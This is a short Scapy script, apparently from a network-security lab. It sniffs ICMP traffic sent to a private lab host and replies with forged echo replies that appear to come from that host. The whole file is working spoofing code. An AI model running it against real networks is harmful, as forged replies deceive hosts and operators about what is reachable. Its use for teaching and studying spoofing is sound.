from scapy.all import *

def send_pkt(pkt):
    print("Original Packet")
    print("Source IP :", pkt[IP].src)
    print("Destination IP :", pkt[IP].dst) 

    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    ip.ttl = 99
    icmp = ICMP(type=0, id=pkt[ICMP].id)

    if pkt.haslayer(Raw):
        data = pkt[Raw].load
        newpkt = ip/icmp/data
    else:
        newpkt = ip/icmp

    print("Spoofed Packet")
    print("Source IP :", newpkt[IP].src)
    print("Destination IP :", newpkt[IP].dst)

    send(newpkt, verbose=0)

sniff(iface='br-0d031b6f5c71', filter='icmp and dst host 10.9.0.6', prn=send_pkt)

